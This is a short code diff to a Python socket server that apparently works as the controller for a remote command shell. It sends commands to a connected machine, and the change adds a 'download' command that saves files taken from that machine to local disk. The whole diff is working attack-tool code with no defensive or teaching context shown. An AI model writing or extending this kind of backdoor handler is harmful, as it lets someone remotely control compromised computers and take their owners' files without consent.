@@ -28,9 +28,16 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         return json.loads(data)
 
 
+    def write_file(path, filedata):
+        with open(path, "wb") as file:
+            file.write(filedata.encode("utf-8", "ignore"))
+            return "[+] Download successful"
+
+
     def send(data):
         json_data = json.dumps(data)
         conn.send(json_data.encode())
+
 
     def command_execution(command):
         send(command)
@@ -45,6 +52,13 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         command = command.split(" ")
         try:
             data = command_execution(command)
+            if command[0] == "download" and "[+] Error" not in data:
+                if len(command) > 2:
+                    data = write_file(command[2], data)
+                else:
+                    data = write_file(command[1], data)
+
         except Exception:
-            data = "[+] Error".encode()
+            data = "[+] Error"
+
         print(data)
